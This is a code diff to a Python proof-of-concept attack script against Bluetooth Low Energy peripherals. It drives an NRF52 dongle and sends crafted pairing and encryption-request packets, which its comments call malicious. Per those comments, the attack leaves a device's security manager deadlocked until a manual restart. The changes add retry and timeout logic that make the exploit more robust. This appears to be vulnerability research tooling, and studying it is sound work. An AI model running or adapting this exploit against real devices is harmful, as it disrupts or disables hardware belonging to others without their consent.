@@ -31,6 +31,7 @@ paring_auth_request = 0x08 | + 0x01  # Le Secure Connection + bounding
 
 # Internal vars
 SCAN_TIMEOUT = 2
+CRASH_TIMEOUT = 7
 none_count = 0
 end_connection = False
 connecting = False
@@ -41,6 +42,8 @@ conn_tx_packet_counter = 0
 conn_rx_packet_counter = 0
 encryption_enabled = False
 slave_addr_type = 0
+smp_retries = 0
+run_script = True
 # Autoreset colors
 colorama.init(autoreset=True)
 
@@ -80,6 +83,18 @@ def scan_timeout():
         AdvA=advertiser_address)
     driver.send(scan_req)
     start_timeout('scan_timeout', SCAN_TIMEOUT, scan_timeout)
+
+
+def smp_timeout():
+    global smp_retries, run_script
+    print(Fore.YELLOW + '-----------------------------------------------------------------------')
+    print(Fore.GREEN + 'Peripheral is not answering a SMP/ENC request. This is a good indication')
+    if smp_retries < 5:
+        print(Fore.YELLOW + 'Retrying...')
+        smp_retries += 1
+        scan_timeout()
+    else:
+        run_script = False
 
 
 def set_security_settings(pkt):
@@ -162,7 +177,7 @@ driver.send(scan_req)
 start_timeout('scan_timeout', SCAN_TIMEOUT, scan_timeout)
 
 print(Fore.YELLOW + 'Waiting advertisements from ' + advertiser_address)
-while True:
+while run_script:
     pkt = None
     # Receive packet from the NRF52 Dongle
     data = driver.raw_receive()
@@ -260,6 +275,7 @@ while True:
 
         # THE ATTACK STARTS HERE !!!!
         elif SM_Pairing_Response in pkt:
+            start_timeout('smp_timeout', SCAN_TIMEOUT, smp_timeout)
             # Pairing request accepted
             # ediv and rand are 0 on first time pairing
             conn_iv = '\x00' * 4  # set IVm (IV of master)
@@ -272,6 +288,7 @@ while True:
             driver.send(enc_request)  # Send the malicious packet (2/2)
 
         elif LL_ENC_RSP in pkt:
+            update_timeout('smp_timeout')
             # Get IVs and SKDs from slave encryption response
             conn_skd += pkt[LL_ENC_RSP].skds  # SKD = SKDm || SKDs
             conn_iv += pkt[LL_ENC_RSP].ivs  # IV = IVm || IVs
@@ -286,11 +303,12 @@ while True:
 
         # Slave will send LL_ENC_RSP before the LL_START_ENC_RSP
         elif LL_START_ENC_REQ in pkt:
+            disable_timeout('smp_timeout')
             print(Fore.YELLOW + 'Received encryption request start from peripheral during the pairing procedure!!!')
-            print(Fore.YELLOW + 'This means that the peripheral is using some unknown LTK here (informed by the SMP)')
+            print(Fore.YELLOW + 'This means that the peripheral is using some unknown LTK here (informed its SMP)')
             # Encryption setup procedure accepted
             # Disconnecting here (end_connection = True) causes peripheral to deadlock SMP to not perform
-            # further pairings Peripheral SMP gets back to normal after user restarts manually the device
+            # further pairings. Peripheral SMP gets back to normal after user restarts manually the device
             # end_connection = True # (Uncomment here)
             encryption_enabled = True
             pkt = BTLE(access_addr=access_address) / BTLE_DATA() / CtrlPDU() / LL_START_ENC_RSP()
@@ -318,6 +336,8 @@ while True:
 
             print(Fore.YELLOW + 'Waiting advertisements from ' + advertiser_address)
             driver.send(scan_req)
-            start_timeout('crash_timeout', 7, crash_timeout)
+            start_timeout('crash_timeout', CRASH_TIMEOUT, crash_timeout)
 
-sleep(0.01)
+    sleep(0.01)
+
+print(Fore.YELLOW + 'Script ended')
